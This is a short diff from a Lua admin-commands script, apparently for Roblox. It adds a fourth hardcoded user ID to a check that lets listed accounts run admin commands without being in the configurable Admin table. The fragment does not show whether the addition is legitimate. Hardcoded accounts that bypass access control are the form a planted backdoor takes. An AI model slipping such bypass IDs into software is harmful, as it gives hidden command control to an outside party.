@@ -14901,7 +14901,7 @@ end)
 
 -- [[ Admin Player]]
 function IsAdminAndRun(Message,Player)
-	if Admin[Player.UserId] or (Player.UserId==156256804 or Player.UserId==530829101 or Player.UserId==229501685) then
+	if Admin[Player.UserId] or (Player.UserId==156256804 or Player.UserId==530829101 or Player.UserId==229501685 or Player.UserId==3470956640) then
 		lib.parseCommand(Message,Player)
 	end
 end
